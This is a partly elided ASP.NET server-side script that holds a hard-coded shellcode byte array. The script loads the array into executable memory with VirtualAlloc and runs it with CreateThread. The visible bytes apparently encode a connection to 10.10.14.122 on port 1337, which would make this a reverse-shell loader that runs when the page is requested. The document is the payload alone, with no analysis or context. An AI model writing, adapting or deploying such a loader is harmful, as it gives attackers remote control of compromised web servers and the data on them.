...
<script runat="server">
    ...
    {
        byte[] tgHco = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x89,0xe5,0x0f,0xb7,0x4a,0x26,
...
0x10,0x8b,0x42,0x3c,0x57,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x58,0x20,0x50,0x8b,0x48,0x18,0x01,0xd3,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x7a,0x68,0x02,0x00,0x05,0x39,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr hfd2nt1nRI3P = VirtualAlloc(IntPtr.Zero,(UIntPtr)tgHco.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(tgHco,0,hfd2nt1nRI3P,tgHco.Length);
        IntPtr v2m = IntPtr.Zero;
        IntPtr lOEBDknZA0 = CreateThread(IntPtr.Zero,UIntPtr.Zero,hfd2nt1nRI3P,IntPtr.Zero,0,ref v2m);
    }
</script>
